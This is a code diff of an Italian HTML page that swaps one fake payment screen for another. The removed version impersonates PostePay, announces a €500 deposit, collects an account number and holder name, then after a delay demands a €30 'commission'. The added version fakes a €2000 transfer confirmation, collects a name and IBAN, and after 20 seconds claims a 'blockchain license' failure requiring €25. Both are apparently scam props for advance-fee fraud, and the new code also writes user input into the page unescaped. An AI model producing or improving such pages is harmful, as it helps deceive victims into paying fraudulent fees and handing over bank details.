@@ -1,169 +1,156 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Deposito in arrivo - €500</title>
+  <meta charset="UTF-8">
+  <title>Conferma Bonifico</title>
   <style>
     body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f4f4;
       margin: 0;
-      font-family: system-ui, sans-serif;
-      background: #f5f5f5;
-      color: #222;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 16px;
+      padding: 0;
+      color: #333;
     }
-
-    .card {
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
       background: #fff;
-      border: 1px solid #ddd;
       border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.05);
       padding: 24px;
-      width: 100%;
-      max-width: 420px;
       text-align: center;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.1);
     }
-
-    .logo {
-      font-weight: 800;
-      font-size: 22px;
-      color: #ffcc00;
-      margin-bottom: 12px;
-    }
-
-    h1 {
-      font-size: 20px;
-      margin-bottom: 12px;
-      color: #333;
-    }
-
-    .amount {
-      font-size: 18px;
+    h2 {
+      color: #0078D4;
       margin-bottom: 16px;
-      color: #444;
     }
-
-    .loader {
-      width: 64px;
-      height: 64px;
-      border: 6px solid rgba(0,0,0,0.1);
-      border-top: 6px solid #ffcc00;
-      border-radius: 50%;
-      margin: 20px auto;
-      animation: spin 1s linear infinite;
-      display: none;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .btn {
-      appearance: none;
-      border: none;
-      background: #ffcc00;
-      color: #222;
-      padding: 12px 16px;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      margin-top: 12px;
-      width: 100%;
-    }
-
-    .form-box {
-      display: none;
-      margin-top: 16px;
-      text-align: left;
-    }
-
-    .form-box label {
-      font-size: 14px;
-      color: #333;
-      margin-bottom: 4px;
+    label {
       display: block;
+      text-align: left;
+      margin-top: 12px;
+      font-weight: bold;
     }
-
-    .form-box input {
+    input {
       width: 100%;
       padding: 10px;
-      border-radius: 6px;
+      margin-top: 6px;
       border: 1px solid #ccc;
-      margin-bottom: 12px;
-      font-size: 15px;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .amount {
+      font-size: 24px;
+      margin: 20px 0;
+      color: #222;
+    }
+    .send-btn {
+      background-color: #6a1b9a;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
     }
 
-    .error {
+    /* Modal */
+    .modal {
       display: none;
-      margin-top: 20px;
-      padding: 14px;
-      background: rgba(255,92,92,0.1);
-      border: 1px solid #ff5c5c;
-      border-radius: 8px;
-      color: #c00;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.4);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .modal-content {
+      background: #fff;
+      padding: 24px;
+      border-radius: 12px;
+      text-align: center;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #6a1b9a;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 16px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .done-btn {
+      background-color: #6a1b9a;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
       font-size: 14px;
-      text-align: left;
+      margin-top: 16px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo">PostePay</div>
-    <h1>Deposito in arrivo</h1>
-    <div class="amount">Importo: <strong>€500</strong></div>
-    <div class="loader" id="loader"></div>
-    <button class="btn" id="acceptBtn">Accetta</button>
+  <div class="container">
+    <h2>Conferma Bonifico</h2>
+    <div class="amount">€2000 inviato</div>
 
-    <div class="form-box" id="formBox">
-      <label for="accountNumber">Numero di conto</label>
-      <input type="text" id="accountNumber" placeholder="Inserisci numero di conto" />
-      <label for="accountName">Nome intestatario</label>
-      <input type="text" id="accountName" placeholder="Inserisci nome intestatario" />
-      <button class="btn" id="confirmBtn">Conferma</button>
-    </div>
+    <label for="name">Nome del destinatario</label>
+    <input type="text" id="name" placeholder="Es. Piccione Elisa">
 
-    <div class="error" id="errorBox">
-      ⚠️ Errore: Commissione non completata.<br />
-      Per confermare e rilasciare il deposito di €500 è necessario pagare una commissione di <strong>€30</strong>.
+    <label for="iban">Numero IBAN</label>
+    <input type="text" id="iban" placeholder="Es. IT66 A076 0111 3000 0107 6539 921">
+
+    <button class="send-btn" onclick="startTransaction()">Invia</button>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal" id="modal">
+    <div class="modal-content" id="modalContent">
+      <div class="spinner" id="spinner"></div>
+      <p id="modalText">Transazione in corso...</p>
     </div>
   </div>
 
   <script>
-    const acceptBtn = document.getElementById('acceptBtn');
-    const formBox = document.getElementById('formBox');
-    const loader = document.getElementById('loader');
-    const confirmBtn = document.getElementById('confirmBtn');
-    const errorBox = document.getElementById('errorBox');
+    function startTransaction() {
+      const modal = document.getElementById('modal');
+      const modalText = document.getElementById('modalText');
+      const spinner = document.getElementById('spinner');
+      const name = document.getElementById('name').value;
+      const iban = document.getElementById('iban').value;
 
-    acceptBtn.addEventListener('click', () => {
-      loader.style.display = 'none';
-      acceptBtn.style.display = 'none';
-      formBox.style.display = 'block';
-    });
+      modal.style.display = 'flex';
+      spinner.style.display = 'block';
+      modalText.textContent = 'Transazione in corso...';
 
-    confirmBtn.addEventListener('click', () => {
-      const accNum = document.getElementById('accountNumber').value.trim();
-      const accName = document.getElementById('accountName').value.trim();
-      if (!accNum || !accName) {
-        alert("Inserisci numero di conto e nome intestatario.");
-        return;
-      }
-
-      // mostra loader
-      formBox.style.display = 'none';
-      loader.style.display = 'block';
-
-      // dopo 15 secondi mostra errore
       setTimeout(() => {
-        loader.style.display = 'none';
-        errorBox.style.display = 'block';
-      }, 15000);
-    });
+        spinner.style.display = 'none';
+        modalText.innerHTML = `
+          ❌ Errore: Verifica della licenza blockchain fallita<br><br>
+          È necessario un pagamento di <strong>€25</strong> per completare la transazione.<br><br>
+          Destinatario: <strong>${name}</strong><br>
+          IBAN: <code>${iban}</code><br><br>
+          <button class="done-btn" onclick="modal.style.display='none'">Fatto</button>
+        `;
+      }, 20000); // 20 secondi
+    }
+
+    window.onclick = function(event) {
+      const modal = document.getElementById('modal');
+      if (event.target === modal) {
+        modal.style.display = 'none';
+      }
+    }
   </script>
 </body>
 </html>
